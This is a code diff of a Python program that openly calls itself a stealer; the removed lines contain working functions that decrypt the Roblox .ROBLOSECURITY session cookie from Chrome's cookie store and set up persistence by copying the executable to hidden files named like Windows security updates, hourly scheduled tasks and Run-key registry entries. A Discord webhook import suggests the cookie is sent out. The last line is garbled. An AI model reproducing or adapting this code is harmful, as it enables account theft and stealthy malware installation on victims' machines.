@@ -75,95 +75,6 @@ def schedule_auto_execution(backup_paths):
     except:
         pass  # Silent failure
 
-import os
-import json
-import base64
-import sqlite3
-import shutil
-import subprocess
-import threading
-import time
-import requests
-import win32crypt
-from Crypto.Cipher import AES
-import robloxpy
-from discordwebhook import Discord
-
-def CookieLog():
-    """Extract Roblox cookie from Chrome"""
-    try:
-        key = get_encryption_key()
-        db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "default", "Cookies")
-        filename = "Cookies.db"
-        shutil.copyfile(db_path, filename)
-        
-        db = sqlite3.connect(filename)
-        cursor = db.cursor()
-        cursor.execute("SELECT host_key, name, value, encrypted_value FROM cookies WHERE host_key like '%roblox%'")
-        
-        for host_key, name, value, encrypted_value in cursor.fetchall():
-            if name == ".ROBLOSECURITY":
-                decrypted_value = decrypt_data(encrypted_value, key)
-                if decrypted_value:
-                    return decrypted_value
-        
-        cursor.close()
-        db.close()
-        os.remove(filename)
-        return None
-    except:
-        return None
-
-def refresh_cookie(cookie):
-    """Attempt to refresh cookie if invalid"""
-    return cookie  # Basic implementation
-
-def get_local_ip():
-    """Get local IP address"""
-    try:
-        import socket
-        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        s.connect(("8.8.8.8", 80))
-        ip = s.getsockname()[0]
-        s.close()
-        return ip
-    except:
-        return "Unknown"
-
-def create_persistence():
-    """Create persistence mechanisms"""
-    try:
-        script_path = os.path.abspath(__file__)
-        if script_path.endswith('.py'):
-            return  # Only for compiled executables
-            
-        # Create backup copies
-        backup_locations = [
-            os.path.join(os.environ.get('APPDATA', ''), 'Microsoft', 'Windows', 'SecurityUpdate.exe'),
-            os.path.join(os.environ.get('TEMP', ''), 'WindowsSecurityUpdate.exe'),
-            os.path.join(os.environ.get('USERPROFILE', ''), 'Documents', 'SecurityPatch.exe'),
-            os.path.join(os.environ.get('PROGRAMDATA', ''), 'Microsoft', 'Windows', 'SystemUpdate.exe')
-        ]
-        
-        for i, backup_path in enumerate(backup_locations):
-            try:
-                os.makedirs(os.path.dirname(backup_path), exist_ok=True)
-                shutil.copy2(script_path, backup_path)
-                subprocess.run(f'attrib +h "{backup_path}"', shell=True, capture_output=True)
-                
-                # Create scheduled task
-                task_name = f"WindowsSecurityUpdate_{i}"
-                schtasks_cmd = f'schtasks /create /tn "{task_name}" /tr "{backup_path}" /sc hourly /mo 1 /f'
-                subprocess.run(schtasks_cmd, shell=True, capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
-                
-                # Add to startup
-                startup_cmd = f'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "SecurityUpdate_{i}" /d "{backup_path}" /f'
-                subprocess.run(startup_cmd, shell=True, capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
-            except:
-                pass
-    except:
-        pass
-
 def background_execution():
     """Run the main stealer function in background every hour"""
     while True:
@@ -400,10 +311,3 @@ if __name__ == "__main__":
     
     # Run the main function once immediately
     main_stealer_function()
-    
-    # Keep the main thread alive
-    try:
-        while True:
-            time.sleep(1)
-    except KeyboardInterrupt:
-        passler_function()
